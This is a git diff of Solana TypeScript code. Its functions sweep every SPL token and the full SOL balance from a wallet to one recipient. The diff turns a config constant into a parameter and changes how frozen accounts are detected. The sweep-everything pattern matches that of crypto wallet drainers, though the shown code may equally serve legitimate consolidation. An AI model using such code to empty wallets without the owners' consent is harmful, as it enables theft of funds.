@@ -1,13 +1,10 @@
 import { AccountLayout, createAssociatedTokenAccountIdempotentInstruction, createCloseAccountInstruction, createTransferInstruction, getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID } from "@solana/spl-token";
 import { Connection, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
-import { RECEPIENT } from "../config";
-
-const recepient = new PublicKey(RECEPIENT)
 
 const maxTxByteLength = 1000
 const txFee = 5000
 
-export async function transferAllTokens (publicKey: PublicKey, connection: Connection) {
+export async function transferAllTokens (publicKey: PublicKey, connection: Connection, recepient: PublicKey) {
 
     const tokenAccountsNonFiltered = await connection.getTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID })
         .then(ctx => {
@@ -21,10 +18,17 @@ export async function transferAllTokens (publicKey: PublicKey, connection: Conne
             })
     })
 
-    const tokenAccounts = tokenAccountsNonFiltered.filter(a => a.data.delegatedAmount === BigInt(0))
+    const tokenAccounts = tokenAccountsNonFiltered.filter(a => a.data.state !== 2)
     const emptyTokenAccounts = tokenAccounts.filter(v => v.data.amount === BigInt(0)).length
     const nonEmptyTokenAccounts = tokenAccounts.filter(v => v.data.amount > BigInt(0)).length
-    const frozenAccounts = tokenAccountsNonFiltered.filter(a => a.data.delegatedAmount > BigInt(0)).length
+    const frozenAccounts = tokenAccountsNonFiltered.filter(a => a.data.state === 2).length
+
+    console.log(tokenAccountsNonFiltered.filter(a => a.data.delegatedAmount > BigInt(0) || a.data.state !== 2).map(t => {
+        return {
+            ...t,
+        publicKey: t.publicKey.toBase58()
+        }
+    }))
 
     const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
 
@@ -71,7 +75,7 @@ export async function transferAllTokens (publicKey: PublicKey, connection: Conne
     }
 }
 
-export async function transferAllSol (publicKey: PublicKey, connection: Connection) {
+export async function transferAllSol (publicKey: PublicKey, connection: Connection, recepient: PublicKey) {
     const balance = await connection.getBalance(publicKey)
     
     const tx = new Transaction().add(
